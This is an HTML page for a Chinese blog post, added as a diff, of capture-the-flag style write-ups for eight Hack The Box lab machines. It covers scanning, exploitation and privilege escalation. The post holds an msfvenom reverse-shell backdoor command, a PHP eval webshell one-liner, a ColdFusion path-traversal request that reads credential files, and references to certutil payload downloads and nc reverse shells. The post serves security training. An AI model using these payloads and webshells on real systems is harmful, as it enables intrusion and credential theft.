@@ -1,0 +1,93 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Hack The Box 的一些WP"><meta name="keywords" content="HackTheBox"><meta name="author" content="白袍"><meta name="copyright" content="白袍"><title>Hack The Box 的一些WP | 白袍的小行星</title><link rel="shortcut icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="白袍的小行星" type="application/atom+xml">
+</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Legacy"><span class="toc-number">1.</span> <span class="toc-text">Legacy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Devel"><span class="toc-number">2.</span> <span class="toc-text">Devel</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Optimum"><span class="toc-number">3.</span> <span class="toc-text">Optimum</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bastard"><span class="toc-number">4.</span> <span class="toc-text">Bastard</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Arctic"><span class="toc-number">5.</span> <span class="toc-text">Arctic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Grandpa"><span class="toc-number">6.</span> <span class="toc-text">Grandpa</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bounty"><span class="toc-number">7.</span> <span class="toc-text">Bounty</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Jerry"><span class="toc-number">8.</span> <span class="toc-text">Jerry</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/57424ce0a622b132.jpg"></div><div class="author-info__name text-center">白袍</div><div class="author-info__description text-center">莫忘少年凌云志，曾许天下第一流！</div><div class="follow-button"><a href="https://github.com/evilAdan0s" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">16</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">7</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="http://www.d-rose.cn/" target="_blank" rel="noopener">D-R0s1</a><a class="author-info-links__name text-center" href="http://www.free04k.cn/" target="_blank" rel="noopener">Free04k</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/back.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">白袍的小行星</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">Hack The Box 的一些WP</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-06-27</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>重新拾起了HTB的账号，开了个会员，从头练级！</p>
+<p>现在会员可以使用pwnbox，就是在他们假设的一个parrot os，可以ssh连上去干，很方便，就是时长太短，一个月才给24小时，得省着用。</p>
+<h1 id="Legacy"><a href="#Legacy" class="headerlink" title="Legacy"></a>Legacy</h1><p><img src="/images/QQ20200623-230253@2x.png" alt=""></p>
+<p>最简单的一题，扫端口发现只有139和445：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.4</span><br><span class="line">Host is up (0.076s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE  SERVICE       VERSION</span><br><span class="line">139&#x2F;tcp  open   netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445&#x2F;tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds</span><br><span class="line">3389&#x2F;tcp closed ms-wbt-server</span><br></pre></td></tr></table></figure>
+
+<p>再看了下日期，发现是永恒之蓝曝光的后一天，心想这动作太快了吧，就用17010打了一发，结果不行。</p>
+<p>XP的系统，就试了下<code>ms08067</code>，因为自己IP没搞清楚浪费了点时间，但还是打下来了。</p>
+<h1 id="Devel"><a href="#Devel" class="headerlink" title="Devel"></a>Devel</h1><p><img src="/images/QQ20200624-002047@2x.png" alt=""></p>
+<p>扫描端口发现了21和80，先<code>curl</code>了一下80，发现是个IIS7的服务默认起始页面。</p>
+<p>看来突破口在21了，使用<code>Anonymous</code>和空密码登录ftp，看到这就是IIS的Web目录，本来我想传个asp的一句话，但是尴尬地发现自己找不到命令行下可以连接asp的Webshell管理工具，所以转向msf.</p>
+<p>用<code>msfvenom</code>生成回连的aspx后门：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D; LPORT&#x3D; -f aspx &gt; 1.aspx</span><br></pre></td></tr></table></figure>
+
+<p>put上传后然后再curl一下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;10.10.10.5&#x2F;1.aspx</span><br></pre></td></tr></table></figure>
+
+<p><code>getuid</code>发现回来的权限是IIS的权限，需要提权。</p>
+<p>因为默认的<code>C:\\windows\system32\inetsrv</code>没有写入权限，所以先找个能写入的，免得exp要释放文件结果失败。</p>
+<p>我在Klion的<a href="https://klionsec.github.io/2017/04/22/win-0day-privilege/#menu" target="_blank" rel="noopener">这篇博客</a>里找了一下，最后用的<code>MS14-058</code>，成功提权。</p>
+<p>写到这里已经半夜十二点多了，原本不需要这么久，就是因为网络老是断，SESSION刚生成不久就掉了，又得重新操作一遍，看来用pwnbox也不是十全十美啊。</p>
+<h1 id="Optimum"><a href="#Optimum" class="headerlink" title="Optimum"></a>Optimum</h1><p>这次我直接在本地的Parrot里连VPN做题，还挺稳定，看来pwnbox只适合没有自己顺手环境的情况。</p>
+<p><img src="/images/QQ20200624-100056@2x.png" alt=""></p>
+<p>扫端口只有一个80，访问发现是个HFS，一种类似于FTP的文件管理系统。</p>
+<p>搜索CVE发现有个RCE，直接在msf里利用，弹回来一个普通用户权限的shell.</p>
+<p><code>systeminfo</code>得到补丁列表，在<a href="http://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">这里</a>查了一下。</p>
+<p>本来试着用土豆，但是不成功，提示<code>User does not have SeImpersonate or SeAssignPrimaryToken Privilege</code>，利用<code>MS16-034</code>提权成功。</p>
+<h1 id="Bastard"><a href="#Bastard" class="headerlink" title="Bastard"></a>Bastard</h1><p><img src="/images/QQ20200624-140614@2x.png" alt=""></p>
+<p>扫描端口结果：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.9</span><br><span class="line">Host is up (0.20s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp    open  http    Microsoft IIS httpd 7.5</span><br><span class="line">135&#x2F;tcp   open  msrpc   Microsoft Windows RPC</span><br><span class="line">49154&#x2F;tcp open  msrpc   Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<p>访问80，发现是<code>Drupal</code>，记得这个有RCE，一查果然有，<code>CVE-2018-7600</code>.</p>
+<p>利用<a href="https://github.com/dreadlocked/Drupalgeddon2" target="_blank" rel="noopener">此rb脚本</a>，写入一个一句话，蚁剑连接。</p>
+<p>在写一句话的时候，要注意直接<code>echo &lt;?php ?&gt; &gt; 1.php</code>这种是不行的，会在payload两边写入双引号，无法正常使用，所以可以这样写：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用^转义&lt;&gt;</span></span><br><span class="line"><span class="built_in">echo</span> ^&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'a'</span>]) ?^&gt; &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell，权限是<code>nt authority\iusr</code>，前几天也遇到过。</p>
+<p>试了几个提权exp，<code>MS18-8120</code>利用成功，得到<code>SYSTEM</code>。</p>
+<h1 id="Arctic"><a href="#Arctic" class="headerlink" title="Arctic"></a>Arctic</h1><p><img src="/images/QQ20200624-145230@2x.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.11</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">135&#x2F;tcp   open  msrpc   Microsoft Windows RPC</span><br><span class="line">8500&#x2F;tcp  open  fmtp?</span><br><span class="line">49154&#x2F;tcp open  msrpc   Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<p>135先不管，看了下8500，发现有个目录遍历：</p>
+<p><img src="/images/QQ20200624-151004@2x.png" alt=""></p>
+<p>点进去看到是<code>Cold Fusion</code>，用一个目录穿越的CVE获得管理员哈希：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;CFIDE&#x2F;administrator&#x2F;enter.cfm?locale&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ColdFusion8&#x2F;lib&#x2F;password.properties%00en</span><br></pre></td></tr></table></figure>
+
+<p>解密得到密码为<code>happyday</code>，登录后台。</p>
+<p>在此处得到物理路径：</p>
+<p><img src="/images/QQ20200624-152150@2x.png" alt=""></p>
+<p>定时任务里：</p>
+<p><img src="/images/QQ20200624-160930@2x.png" alt=""></p>
+<p>URL是自己本机的地址，放上了webshell，File就是shell应该上传到的路径。</p>
+<p>本地可以利用python快速搭建Web服务器:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+
+<p>最后nc监听对应端口，再访问shell地址即可收到回连shell.</p>
+<p>权限为<code>arctic\tolis</code>，其实就是普通用户。</p>
+<p><code>certutil.exe</code>下载个<code>meterpreter</code>的shell执行，方便提权。</p>
+<p>还是使用<code>MS18-8120</code>，真好使，直接到<code>SYSTEM</code>.</p>
+<h1 id="Grandpa"><a href="#Grandpa" class="headerlink" title="Grandpa"></a>Grandpa</h1><p><img src="/images/QQ20200624-172720@2x.png" alt=""></p>
+<p>端口只有个80，IIS 6，访问是个默认页面，看来是直接用CVE打了。</p>
+<p>用<code>CVE-2017-7269</code>获得一个shell，发现是最小的<code>nt authority\network service</code>权限，靠。</p>
+<p>因为这会是个RCE拿到的shell，功能有点不全，干脆生成一个后门然后用这个shell执行。</p>
+<p>本来想用土豆来提权，试了几次发现不行，最后发现是系统比较老，应该是XP，就用<code>ms10-015</code>成功提权了。</p>
+<p>另外还有一个<a href="https://www.hackthebox.eu/home/machines/profile/14" target="_blank" rel="noopener">Granny</a>，做法类似，只不过换成了一个IIS 6的任意文件上传，然后提权需要用土豆，不单独写了。</p>
+<h1 id="Bounty"><a href="#Bounty" class="headerlink" title="Bounty"></a>Bounty</h1><p><img src="/images/QQ20200625-205442@2x.png" alt=""></p>
+<p>这个靶机我看了看官方wp，因为一开始找不到什么思路。</p>
+<p>端口只开放了80，是个IIS 7，存在短文件名枚举漏洞。</p>
+<p>使用msf里自带的扫描模块<code>iis_shortname_scanner</code>，扫到一个上传目录和一个上传点。</p>
+<p>这里有个坑点，IIS短文件名只能爆破出前六位，后面的就自己想招吧。</p>
+<p>一般是从字典里提取出前六位符合的，然后再爆破。</p>
+<p>上传点做了限制，只能上传一个<code>.config</code>后缀的，这很明显就是提示了，上传一个<code>web.config</code>，里面加个asp马，蚁剑成功连接。</p>
+<p>没多久我的马就404了，应该不是因为杀软，估计每隔一段时间就定时清除一下上传目录，本来想直接再在其他web目录传个asp，结果发现不可写，草。</p>
+<p>没办法，通过powershell弹了个nc，再<code>certutil</code>下载一个msf的shell执行，这一步费了我好久的时间。</p>
+<p>拿到这个就很简单了，无补丁的2008，直接上土豆，成功提权。</p>
+<h1 id="Jerry"><a href="#Jerry" class="headerlink" title="Jerry"></a>Jerry</h1><p><img src="/images/QQ20200627-163624@2x.png" alt=""></p>
+<p>名字其实也算是提示吧，8080有个tomcat，扫描到一个默认密码<code>tomcat/s3cret</code>.</p>
+<p>登录后台上传war包获取shell，很熟练，一看权限是<code>SYSTEM</code>，连提权都省了。</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">白袍</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://eviladan0s.github.io/2020/06/23/hackthebox-wp-1/">https://eviladan0s.github.io/2020/06/23/hackthebox-wp-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HackTheBox/">HackTheBox</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="/img/weixin.png"><div class="post-qr-code__desc">感谢支持</div></div></div><nav id="pagination"><div class="next-post pull-right"><a href="/2020/06/22/kkcms-again/"><span>关于kkcms的填坑</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/back.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By 白袍</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
